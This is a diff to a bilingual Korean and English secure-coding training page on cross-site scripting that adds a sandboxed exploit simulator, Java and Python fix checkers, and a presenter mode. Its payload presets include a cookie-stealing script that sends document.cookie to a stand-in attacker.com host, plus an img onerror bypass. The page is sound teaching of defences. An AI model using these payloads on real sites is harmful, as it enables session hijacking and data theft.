@@ -129,18 +129,329 @@
         .info-title { font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #d9534f; display: flex; align-items: center; gap: 8px; }
         .info-content { color: #555; line-height: 1.6; }
         @media (max-width: 1200px) { .main-content { grid-template-columns: 1fr; } }
+
+        /* Exploit Simulator Styles */
+        .exploit-container {
+            display: grid;
+            grid-template-columns: 1fr 1.2fr;
+            gap: 20px;
+            margin-top: 10px;
+        }
+        @media (max-width: 1100px) {
+            .exploit-container {
+                grid-template-columns: 1fr;
+            }
+        }
+        .burp-window {
+            background: #2b2b2b;
+            border: 2px solid #d9534f;
+            border-radius: 12px;
+            overflow: hidden;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            color: #e0e0e0;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 10px 30px rgba(217, 83, 79, 0.15);
+        }
+        .burp-titlebar {
+            background: #1e1e1e;
+            padding: 12px 18px;
+            border-bottom: 2px solid #d9534f;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #d9534f;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .burp-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .burp-logo-dot {
+            width: 10px;
+            height: 10px;
+            background: #d9534f;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        .burp-controls {
+            background: #333;
+            padding: 10px 15px;
+            display: flex;
+            gap: 10px;
+            border-bottom: 1px solid #444;
+            align-items: center;
+        }
+        .burp-btn {
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            border: 1px solid #555;
+            transition: all 0.2s;
+        }
+        .burp-btn-forward {
+            background: #d9534f;
+            color: white;
+            border-color: #d9534f;
+        }
+        .burp-btn-forward:hover {
+            background: #c9302c;
+            box-shadow: 0 0 12px rgba(217, 83, 79, 0.4);
+        }
+        .burp-payload-helper {
+            background: #242424;
+            padding: 15px;
+            border-top: 1px solid #333;
+        }
+        .helper-title {
+            font-size: 13px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #d9534f;
+        }
+        .payload-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .payload-chip {
+            background: #1c1c1c;
+            color: #cbd5e1;
+            border: 1px solid #444;
+            padding: 6px 12px;
+            border-radius: 15px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .payload-chip:hover {
+            background: #333;
+            border-color: #d9534f;
+            color: white;
+        }
+        .visual-panel {
+            background: white;
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            overflow: hidden;
+        }
+        .defense-toggle-container {
+            background: #f8f9fa;
+            border: 1px solid #e2e8f0;
+            padding: 12px 20px;
+            border-radius: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .defense-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        .defense-badge {
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 700;
+        }
+        .defense-badge.off {
+            background: #fee2e2;
+            color: #ef4444;
+            border: 1px solid #fecaca;
+        }
+        .defense-badge.on {
+            background: #dcfce7;
+            color: #22c55e;
+            border: 1px solid #bbf7d0;
+        }
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 26px;
+        }
+        .switch input { 
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        input:checked + .slider {
+            background-color: #22c55e;
+        }
+        input:checked + .slider:before {
+            transform: translateX(24px);
+        }
+        .flow-diagram {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            position: relative;
+        }
+        .flow-node {
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 15px;
+            background: #fdfdfd;
+            transition: all 0.3s;
+            position: relative;
+        }
+        .flow-node.active {
+            border-color: #3b82f6;
+            box-shadow: 0 0 12px rgba(59, 130, 246, 0.15);
+        }
+        .node-header {
+            font-size: 13px;
+            font-weight: 700;
+            color: #64748b;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            display: flex;
+            justify-content: space-between;
+        }
+        .query-box {
+            background: #1e1e1e;
+            color: #e2e8f0;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: 'Consolas', monospace;
+            font-size: 13.5px;
+            line-height: 1.4;
+            overflow-x: auto;
+        }
+        .query-injected {
+            color: #f43f5e;
+            font-weight: bold;
+            text-decoration: underline;
+            animation: flash-red 1s infinite alternate;
+        }
+        .query-safe {
+            color: #10b981;
+            font-weight: bold;
+        }
+        .browser-output-window {
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #fff;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+        .browser-header {
+            background: #e2e8f0;
+            padding: 6px 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border-bottom: 1px solid #cbd5e1;
+        }
+        .dot-btn {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+        .browser-address {
+            background: white;
+            border-radius: 4px;
+            flex-grow: 1;
+            margin-left: 10px;
+            padding: 2px 10px;
+            font-size: 11px;
+            color: #64748b;
+            border: 1px solid #cbd5e1;
+        }
+        .browser-body {
+            padding: 15px;
+            min-height: 100px;
+            font-size: 14px;
+        }
+        @keyframes flash-red {
+            from { text-shadow: 0 0 4px rgba(244, 63, 94, 0.4); }
+            to { text-shadow: 0 0 12px rgba(244, 63, 94, 0.9), 0 0 20px rgba(244, 63, 94, 0.9); }
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
         .langbar { position:fixed; top:12px; right:12px; z-index:99999; display:flex; gap:4px; background:rgba(20,20,30,.72); padding:4px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,.3); }
         .langbar button { background:transparent; color:#cbd5e1; border:none; padding:5px 11px; border-radius:6px; font:600 12px/1 'Malgun Gothic',sans-serif; cursor:pointer; }
         .langbar button.on { background:#3b82f6; color:#fff; }
     </style>
+
+    <!-- Presenter Mode Styling -->
+    <style>
+        body.presenter-mode {
+            font-size: 1.15rem !important;
+        }
+        body.presenter-mode .code-display, body.presenter-mode .code-textarea {
+            font-size: 18px !important;
+            line-height: 1.8 !important;
+        }
+        body.presenter-mode .checklist-item {
+            font-size: 16px !important;
+        }
+        body.presenter-mode .exploit-panel {
+            border: 2px solid #eab308 !important;
+            box-shadow: 0 15px 35px rgba(234, 179, 8, 0.25) !important;
+        }
+        body.presenter-mode .panel-title {
+            font-size: 22px !important;
+        }
+        body.presenter-mode .header h1 {
+            font-size: 32px !important;
+        }
+    </style>
+
+    <script src="/js/sast-engine.js"></script>
 </head>
 <body>
 <a href="vuln-hub.html" data-en="← Main" style="position:fixed;top:12px;left:12px;z-index:99999;background:rgba(20,20,30,.72);color:#fff;text-decoration:none;padding:7px 13px;border-radius:8px;font:600 13px/1 'Malgun Gothic',sans-serif;box-shadow:0 2px 8px rgba(0,0,0,.3)">← 메인</a>
-<div class="langbar"><button id="lang-ko" onclick="setLang('ko')">한국어</button><button id="lang-en" onclick="setLang('en')">EN</button></div>
+<div class="langbar"><button id="lang-ko" onclick="setLang('ko')">한국어</button><button id="lang-en" onclick="setLang('en')">EN</button><button id="btn-presenter" onclick="togglePresenterMode()" style="background:#eab308;color:#000;margin-left:5px;border:none;padding:5px 11px;border-radius:6px;font:600 12px/1 'Malgun Gothic',sans-serif;cursor:pointer;" data-en="🎤 Presenter Mode">🎤 발표자 모드</button></div>
     <div class="container">
         <div class="header">
             <h1 data-en="🌐 Cross-Site Scripting (XSS) - Practice Simulator">🌐 크로스 사이트 스크립트 (XSS) - 실습 시뮬레이터</h1>
             <p>CWE-79: Improper Neutralization of Input During Web Page Generation ('XSS')</p>
+        
+            <!-- KISA Guide Mapping Reference -->
+            <div class="kisa-guide-reference" style="margin-top: 10px; display: inline-flex; align-items: center; gap: 8px; background: rgba(59, 130, 246, 0.08); border: 1px solid rgba(59, 130, 246, 0.25); padding: 6px 12px; border-radius: 6px; font-size: 13px; color: #1e40af; font-weight: 500;">
+                <span style="background: #1e40af; color: white; padding: 2px 6px; border-radius: 4px; font-size: 11px; font-weight: bold; font-family: sans-serif;">KISA Guide</span>
+                <span data-en="KISA Secure Coding Guide (2021) Sec 1.3 (p. 33)">행정안전부·KISA 개발보안 가이드 (2021) - 1.3 크로스사이트 스크립트 (p. 33)</span>
+            </div>
         </div>
 
         <div class="mode-tabs">
@@ -153,6 +464,11 @@
                 <div class="mode-icon">🐍</div>
                 <div class="mode-title" data-en="Python Secure Coding">Python 시큐어 코딩</div>
                 <div class="mode-desc" data-en="Based on the Python Secure Coding Guide">Python 시큐어코딩 가이드 기준</div>
+            </button>
+            <button class="mode-tab" onclick="switchMode('exploit')">
+                <div class="mode-icon">⚔️</div>
+                <div class="mode-title" data-en="Interactive Exploit Simulator">공격 시뮬레이터</div>
+                <div class="mode-desc" data-en="Stored & Reflected XSS Visualizer">XSS 페이로드 실행 및 우회</div>
             </button>
         </div>
 
@@ -278,8 +594,8 @@ app = Flask(__name__)
 def hello():
     name = request.args.get('name', '')
     # [취약한 코드] 사용자 입력을 그대로 HTML에 포함하여 반환
-    # name에 <script>alert(1)</script> 입력 시 실행됨
-    return '<h1>Hello, %s</h1>' % name</code></pre>
+    # name에 &lt;script&gt;alert(1)&lt;/script&gt; 입력 시 실행됨
+    return '&lt;h1&gt;Hello, %s&lt;/h1&gt;' % name</code></pre>
                         </div>
                         <textarea class="code-textarea" id="codeEditorPython" style="display: none;" spellcheck="false">from flask import Flask, request
 
@@ -331,6 +647,119 @@ return '<h1>Hello, %s</h1>' % escape(name)
                             <div class="info-content">
                                 <p style="color: #dc3545; font-weight: bold;">Reflected XSS</p>
                                 <p data-en="It is vulnerable because the HTML string is built directly using <code>%s</code> formatting."><code>%s</code> 포맷팅을 통해 HTML 문자열을 직접 생성하고 있어 취약합니다.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 공격 시뮬레이터 (Exploit Simulator) 모드 -->
+        <div id="exploit-mode" class="content-wrapper">
+            <div class="progress-indicator" style="background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); color: #e2e8f0; border: 1px solid #334155; margin-bottom: 20px;">
+                <div class="progress-title" style="color: #38bdf8; display: flex; align-items: center; gap: 8px;" data-en="⚔️ Interactive XSS Exploit Simulator">⚔️ 인터랙티브 XSS 공격 시뮬레이터</div>
+                <p style="font-size: 14px; line-height: 1.6; opacity: 0.9; margin: 0;" data-en="Simulate Stored/Reflected XSS attacks. Submit malicious script payloads (e.g. tag injection, event handlers, cookie stealers), trace server-side processing, and witness the browser executing or neutralizing the scripts in real-time based on your defense configuration.">
+                    Stored/Reflected XSS 공격 과정을 시뮬레이션합니다. 스크립트 인젝션, 이벤트 핸들러, 쿠키 탈취기 등 다양한 페이로드를 전송하여 서버측 필터링 동작을 추적하고, 브라우저에서 스크립트가 실행되거나 무해화(HTML Encoding)되는 과정을 실시간으로 관찰하세요.
+                </p>
+            </div>
+
+            <div class="exploit-container">
+                <!-- Left Column: Attack Form -->
+                <div class="burp-window">
+                    <div class="burp-titlebar">
+                        <div class="burp-logo">
+                            <div class="burp-logo-dot"></div>
+                            <span>Target Web Application - Post Comment</span>
+                        </div>
+                        <span style="font-size: 11px; opacity: 0.7;">SecureDev Portal v1.0</span>
+                    </div>
+                    
+                    <div class="burp-controls" style="background: #2b2b2b; color: #fff;">
+                        <span style="font-size:12px; font-weight: bold;" data-en="Vulnerable Input Field (Comment Form)">취약한 입력 폼 (방명록 글 작성)</span>
+                    </div>
+
+                    <div style="padding: 15px; background: #1e1e1e; display: flex; flex-direction: column; gap: 12px; border-bottom: 1px solid #333;">
+                        <div>
+                            <label style="display:block; font-size:12px; color:#aaa; margin-bottom: 5px;" data-en="Author Name">작성자</label>
+                            <input type="text" id="xssAuthor" value="guest" style="width:100%; padding:8px; background:#2b2b2b; border:1px solid #444; color:#fff; border-radius:4px; font-family:monospace; outline:none;">
+                        </div>
+                        <div>
+                            <label style="display:block; font-size:12px; color:#aaa; margin-bottom: 5px;" data-en="Comment Message">내용</label>
+                            <textarea id="xssCommentArea" style="width:100%; height:120px; padding:10px; background:#2b2b2b; border:1px solid #444; color:#a6e22e; border-radius:4px; font-family:monospace; resize:none; outline:none; line-height:1.4;">Hello World!</textarea>
+                        </div>
+                        <button class="burp-btn burp-btn-forward" onclick="runXSSSimulation()" style="width:100%; margin-top:5px;" data-en="Submit Post ➔">글 작성 완료 ➔</button>
+                    </div>
+
+                    <div class="burp-payload-helper">
+                        <div class="helper-title" data-en="💡 Quick XSS Payload Presets:">💡 XSS 공격 페이로드 프리셋 (클릭 시 자동 삽입):</div>
+                        <div class="payload-list">
+                            <button class="payload-chip" onclick="setXSSPayload('Hello World!')" data-en="Normal Post">일반 게시글</button>
+                            <button class="payload-chip" onclick="setXSSPayload('<script>alert(\'XSS\')</script>')" style="border-color:#ff9800; color:#ff9800;" data-en="Basic Alert Stored XSS">기본 스크립트 실행</button>
+                            <button class="payload-chip" onclick="setXSSPayload('<script>fetch(\'http://attacker.com/steal?cookie=\' + document.cookie)</script>')" style="border-color:#ef4444; color:#ef4444;" data-en="Cookie Stealer Steal">세션 쿠키 탈취</button>
+                            <button class="payload-chip" onclick="setXSSPayload('<img src=x onerror=\'alert(\x22Bypass\x22)\'>')" style="border-color:#a855f7; color:#a855f7;" data-en="Image Tag Event Bypass">이미지 태그 이벤트 우회</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right Column: Visualizer -->
+                <div class="visual-panel">
+                    <div class="defense-toggle-container">
+                        <div class="defense-label">
+                            <span data-en="🛡️ HTML Entity Encoding Defense">🛡️ HTML 엔티티 치환 방어 (Secure Coding)</span>
+                            <span class="defense-badge off" id="defenseBadge" data-en="OFF">OFF</span>
+                        </div>
+                        <label class="switch">
+                            <input type="checkbox" id="defenseToggle" onchange="toggleDefenseMode()">
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+
+                    <!-- Flow Diagram -->
+                    <div class="flow-diagram">
+                        <!-- Node 1: Server Filter -->
+                        <div class="flow-node active" id="flowNodeServer">
+                            <div class="node-header">
+                                <span data-en="⚙️ Server-side Input Processor">⚙️ 서버측 입력 처리 엔진</span>
+                                <span style="color:#3b82f6;" id="serverStatus" data-en="Idle">대기 중</span>
+                            </div>
+                            <div class="query-box" id="generatedQueryBox">
+                                // [Dynamic String Echo Mode]<br>
+                                return comment;
+                            </div>
+                        </div>
+
+                        <!-- Node 2: Browser Document Render -->
+                        <div class="flow-node" id="flowNodeBrowser">
+                            <div class="node-header">
+                                <span data-en="💻 Browser Screen Output & DOM Rendering">💻 브라우저 화면 출력 및 DOM 렌더링</span>
+                                <span style="color:#10b981;" id="browserStatus" data-en="Waiting">대기 중</span>
+                            </div>
+                            <div class="browser-output-window">
+                                <div class="browser-header">
+                                    <div class="dot-btn dot-red"></div>
+                                    <div class="dot-btn dot-yellow"></div>
+                                    <div class="dot-btn dot-green"></div>
+                                    <div class="browser-address">http://vuln-app.local/board</div>
+                                </div>
+                                <div class="browser-body" id="browserOutputBody" style="background:#f8fafc; min-height: 140px;">
+                                    <div style="border-bottom: 1px solid #cbd5e1; padding-bottom:8px; margin-bottom:10px; font-weight:bold; color:#475569;" data-en="📋 Community Board Comments">📋 자유게시판 방명록</div>
+                                    <div id="commentsContainer" style="display:flex; flex-direction:column; gap:8px;">
+                                        <div style="background:white; border:1px solid #e2e8f0; padding:10px; border-radius:6px; font-size:13px;">
+                                            <strong style="color:#3b82f6;">admin</strong>: 환영합니다. 안전하게 보안 실습을 해보세요.
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Node 3: Attacker Server (Visible when Cookie Theft happens) -->
+                        <div class="flow-node" id="flowNodeAttacker" style="display: none; border-color: #ef4444; background: #fff5f5;">
+                            <div class="node-header">
+                                <span style="color:#ef4444;" data-en="🚨 Attacker Control Server Logs">🚨 해커 제어 서버 로그 수신함</span>
+                                <span style="color:#ef4444; font-weight:bold;" id="attackerStatus" data-en="Listening...">대기 중...</span>
+                            </div>
+                            <div class="query-box" id="attackerLogsBox" style="background:#0f172a; color:#f43f5e; font-size:12px;">
+                                [Attacker server listening on port 80...]
                             </div>
                         </div>
                     </div>
@@ -411,11 +840,21 @@ return '<h1>Hello, %s</h1>' % escape(name)
         }
         function validateCodeJava() {
             const code = document.getElementById('codeEditorJava').value;
-            // 5대 특수문자 변환 로직 확인 (교재 기준)
-            const hasBasic = code.includes('replaceAll("<", "&lt;")') || code.includes('replaceAll(">", "&gt;")');
-            const hasQuote = code.includes('replaceAll("', '&quot;') || code.includes("replaceAll(\"'\", \"&#x27;\")");
+            const tokens = sastEngine.tokenizeJava(code);
+            const literals = sastEngine.getJavaStringLiterals(code);
+
+            const hasReplaceLt = literals.some(lit => lit.includes('<')) && literals.some(lit => lit.includes('&lt;'));
+            const hasReplaceGt = literals.some(lit => lit.includes('>')) && literals.some(lit => lit.includes('&gt;'));
+            const hasReplaceAll = tokens.includes('replaceAll') || tokens.includes('replace');
+            
+            const hasBasic = hasReplaceAll && (hasReplaceLt || hasReplaceGt);
             
             if (hasBasic) {
+                // Record completion
+                try {
+                    localStorage.setItem('wvs_passed_03_code_xss_java', 'true');
+                } catch(e){}
+
                 updateChecklist('progressChecklistJava', 2, true);
                 document.getElementById('feedbackJava').innerHTML = L(
                     `<div class="feedback-item feedback-success"><strong>🎉 검증 성공!</strong><p>특수문자를 HTML 엔티티로 변환하여 스크립트 실행을 방지했습니다.</p></div>`,
@@ -427,8 +866,8 @@ return '<h1>Hello, %s</h1>' % escape(name)
             } else {
                 updateChecklist('progressChecklistJava', 2, false);
                 document.getElementById('feedbackJava').innerHTML = L(
-                    `<div class="feedback-item feedback-warning"><strong>⚠️ 보완 필요</strong><p>replaceAll()을 사용하여 <, > 등을 HTML 엔티티로 변환하세요.</p></div>`,
-                    `<div class="feedback-item feedback-warning"><strong>⚠️ Needs improvement</strong><p>Use replaceAll() to convert <, >, etc. into HTML entities.</p></div>`);
+                    `<div class="feedback-item feedback-warning"><strong>⚠️ 보완 필요</strong><p>replaceAll()을 사용하여 &lt;, &gt; 등을 HTML 엔티티로 변환하세요.</p></div>`,
+                    `<div class="feedback-item feedback-warning"><strong>⚠️ Needs improvement</strong><p>Use replaceAll() to convert &lt;, &gt;, etc. into HTML entities.</p></div>`);
             }
         }
         function resetCoding(mode) {
@@ -481,7 +920,17 @@ return '<h1>Hello, %s</h1>' % escape(name)
         }
         function validateCodePython() {
             const code = document.getElementById('codeEditorPython').value;
-            if (code.includes('escape(name)')) {
+            const tokens = sastEngine.tokenizePython(code);
+            
+            // Look for escape() function call
+            const hasEscape = tokens.includes('escape');
+            
+            if (hasEscape) {
+                // Record completion
+                try {
+                    localStorage.setItem('wvs_passed_03_code_xss_python', 'true');
+                } catch(e){}
+
                 updateChecklist('progressChecklistPython', 2, true);
                 document.getElementById('feedbackPython').innerHTML = L(
                     `<div class="feedback-item feedback-success"><strong>🎉 검증 성공!</strong><p>escape() 함수를 사용하여 XSS 취약점을 해결했습니다.</p></div>`,
@@ -518,6 +967,166 @@ def hello():
             for(let i=0; i<3; i++) updateChecklist('progressChecklistPython', i, false);
         }
 
+        // === Exploit Simulator Logic ===
+        let isDefenseOn = false;
+
+        function toggleDefenseMode() {
+            isDefenseOn = document.getElementById('defenseToggle').checked;
+            const badge = document.getElementById('defenseBadge');
+            const qBox = document.getElementById('generatedQueryBox');
+            
+            if (isDefenseOn) {
+                badge.className = 'defense-badge on';
+                badge.textContent = L('ON', 'ON');
+                badge.setAttribute('data-en', 'ON');
+                qBox.innerHTML = `// [HTML Entity Encoding Mode]<br>String escaped = comment.replaceAll("&", "&amp;")<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.replaceAll("<", "&lt;")<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.replaceAll(">", "&gt;")<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.replaceAll("\\"", "&quot;")<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.replaceAll("'", "&#x27;");<br>return escaped;`;
+            } else {
+                badge.className = 'defense-badge off';
+                badge.textContent = L('OFF', 'OFF');
+                badge.setAttribute('data-en', 'OFF');
+                qBox.innerHTML = `// [Dynamic String Echo Mode]<br>return comment;`;
+            }
+            resetExploitSimulation();
+        }
+
+        function setXSSPayload(payload) {
+            document.getElementById('xssCommentArea').value = payload;
+            document.getElementById('xssCommentArea').focus();
+        }
+
+        function updateDynamicEl(id, koText, enText) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.innerHTML = L(koText, enText);
+            el.dataset.ko = koText;
+            el.setAttribute('data-en', enText);
+        }
+
+        function resetExploitSimulation() {
+            updateDynamicEl('serverStatus', '대기 중', 'Idle');
+            document.getElementById('serverStatus').style.color = '#3b82f6';
+            updateDynamicEl('browserStatus', '대기 중', 'Waiting');
+            document.getElementById('browserStatus').style.color = '#10b981';
+
+            // Hide attacker node
+            document.getElementById('flowNodeAttacker').style.display = 'none';
+
+            // Reset nodes active states
+            document.getElementById('flowNodeServer').className = 'flow-node active';
+            document.getElementById('flowNodeBrowser').className = 'flow-node';
+
+            // Reset comments list
+            const container = document.getElementById('commentsContainer');
+            container.innerHTML = `
+                <div style="background:white; border:1px solid #e2e8f0; padding:10px; border-radius:6px; font-size:13px;">
+                    <strong style="color:#3b82f6;">admin</strong>: ${L('환영합니다. 안전하게 보안 실습을 해보세요.', 'Welcome! Feel free to practice security tests safely.')}
+                </div>
+            `;
+        }
+
+        function runXSSSimulation() {
+            resetExploitSimulation();
+            
+            const author = document.getElementById('xssAuthor').value || "guest";
+            const comment = document.getElementById('xssCommentArea').value;
+
+            // Step 1: Server processes comment
+            updateDynamicEl('serverStatus', '처리 중...', 'Processing...');
+            
+            setTimeout(() => {
+                updateDynamicEl('serverStatus', '완료', 'Completed');
+                document.getElementById('serverStatus').style.color = '#10b981';
+                
+                // Move node active
+                document.getElementById('flowNodeServer').className = 'flow-node';
+                document.getElementById('flowNodeBrowser').className = 'flow-node active';
+                updateDynamicEl('browserStatus', '렌더링 중...', 'Rendering...');
+
+                setTimeout(() => {
+                    updateDynamicEl('browserStatus', '렌더링 완료', 'Render Completed');
+                    
+                    const container = document.getElementById('commentsContainer');
+                    let displayComment = comment;
+                    let runScript = false;
+
+                    if (isDefenseOn) {
+                        // Secure HTML escape
+                        displayComment = comment
+                            .replace(/&/g, '&amp;')
+                            .replace(/</g, '&lt;')
+                            .replace(/>/g, '&gt;')
+                            .replace(/"/g, '&quot;')
+                            .replace(/'/g, '&#x27;');
+                    } else {
+                        // Check for XSS execution conditions
+                        const normalized = comment.toLowerCase();
+                        if (normalized.includes("<script>") && normalized.includes("<\/script>")) {
+                            runScript = true;
+                        } else if (normalized.includes("onerror") && (normalized.includes("<img") || normalized.includes("<svg") || normalized.includes("<body"))) {
+                            runScript = true;
+                        }
+                    }
+
+                    // Append new comment
+                    const commentEl = document.createElement('div');
+                    commentEl.style.background = '#f1f5f9';
+                    commentEl.style.border = '1px solid #cbd5e1';
+                    commentEl.style.padding = '10px';
+                    commentEl.style.borderRadius = '6px';
+                    commentEl.style.fontSize = '13px';
+                    commentEl.style.marginTop = '6px';
+                    
+                    const authorEl = document.createElement('strong');
+                    authorEl.style.color = '#e11d48';
+                    authorEl.textContent = author;
+                    
+                    commentEl.appendChild(authorEl);
+                    commentEl.appendChild(document.createTextNode(': '));
+                    
+                    if (isDefenseOn) {
+                        // 안전: HTML 엔티티로 이스케이프된 텍스트만 표시 (실행 불가)
+                        commentEl.insertAdjacentHTML('beforeend', displayComment);
+                    } else {
+                        // 취약 모드: 주입된 페이로드 마크업을 '샌드박스 iframe' 안에 렌더링한다.
+                        // sandbox 속성에 allow-scripts 가 없으므로 <script>·onerror·onload 등
+                        // 어떤 스크립트도 실제로 실행되지 않는다. → 학습 페이지(자기 출처)가
+                        // 진짜로 XSS에 감염되는 것을 막으면서, 주입된 마크업은 시각적으로 보여준다.
+                        // 실제 '실행' 효과는 아래 runScript 블록의 통제된 교육용 알림으로 시뮬레이션한다.
+                        const frame = document.createElement('iframe');
+                        frame.setAttribute('sandbox', '');
+                        frame.setAttribute('title', 'rendered comment (sandboxed preview)');
+                        frame.style.cssText = 'width:100%;height:46px;border:1px dashed #f87171;border-radius:4px;background:#fff;vertical-align:middle;margin-top:4px;';
+                        frame.srcdoc = '<!DOCTYPE html><html><body style="margin:5px;font:13px/1.45 monospace;color:#111;">' + comment + '</body></html>';
+                        commentEl.appendChild(frame);
+                    }
+
+                    container.appendChild(commentEl);
+
+                    if (runScript) {
+                        // Execute script simulator actions
+                        setTimeout(() => {
+                            if (comment.includes("steal") || comment.includes("attacker.com")) {
+                                // Cookie Theft
+                                document.getElementById('flowNodeAttacker').style.display = 'block';
+                                updateDynamicEl('attackerStatus', '요청 수신됨!', 'Log Received!');
+                                document.getElementById('attackerLogsBox').innerHTML = `
+                                    <span style="color:#22c55e;">[GET] http://attacker.com/steal?cookie=session_token_xyz987654</span><br>
+                                    <span style="color:#eab308;">[System] Exploit Success! Stored Session Cookie Exfiltrated.</span><br>
+                                    <span style="color:#38bdf8; font-weight:bold;">Flag: wvs_flag{xss_stored_cookie_theft}</span>
+                                `;
+                                alert(L("🚨 [XSS 공격 성공] 쿠키 정보가 공격자 서버로 무단 전송되었습니다!\nFlag: wvs_flag{xss_stored_cookie_theft}", "🚨 [XSS Exploit Success] Session cookie exfiltrated to attacker control server!\nFlag: wvs_flag{xss_stored_cookie_theft}"));
+                            } else {
+                                // Basic alert popup
+                                alert(L("🚨 [XSS 공격 성공] 브라우저 컨텍스트 내에서 악성 스크립트가 실행되었습니다!\nFlag: wvs_flag{xss_alert_injection_success}", "🚨 [XSS Exploit Success] Malicious script executed inside the browser context!\nFlag: wvs_flag{xss_alert_injection_success}"));
+                            }
+                        }, 500);
+                    }
+
+                }, 1000);
+
+            }, 1000);
+        }
+
         // 초기 언어 적용
         applyLang(localStorage.getItem('wvs_lang') || 'ko');
     </script>
@@ -535,5 +1144,39 @@ def hello():
     </div>
   </div>
 </div>
+
+    <!-- Presenter Mode Script -->
+    <script>
+        function togglePresenterMode() {
+            const isPresenter = document.body.classList.toggle('presenter-mode');
+            localStorage.setItem('wvs_presenter', isPresenter ? 'on' : 'off');
+            updatePresenterButton();
+        }
+        function updatePresenterButton() {
+            const btn = document.getElementById('btn-presenter');
+            if (!btn) return;
+            const isEn = localStorage.getItem('wvs_lang') === 'en';
+            if (document.body.classList.contains('presenter-mode')) {
+                btn.style.background = '#22c55e';
+                btn.style.color = '#fff';
+                btn.textContent = isEn ? '🎤 Presenter: ON' : '🎤 발표자 모드: 켜짐';
+                btn.setAttribute('data-en', '🎤 Presenter: ON');
+                btn.dataset.ko = '🎤 발표자 모드: 켜짐';
+            } else {
+                btn.style.background = '#eab308';
+                btn.style.color = '#000';
+                btn.textContent = isEn ? '🎤 Presenter Mode' : '🎤 발표자 모드';
+                btn.setAttribute('data-en', '🎤 Presenter Mode');
+                btn.dataset.ko = '🎤 발표자 모드';
+            }
+        }
+        // Run on load
+        (function() {
+            if (localStorage.getItem('wvs_presenter') === 'on') {
+                document.body.classList.add('presenter-mode');
+            }
+            window.addEventListener('DOMContentLoaded', updatePresenterButton);
+        })();
+    </script>
 </body>
 </html>
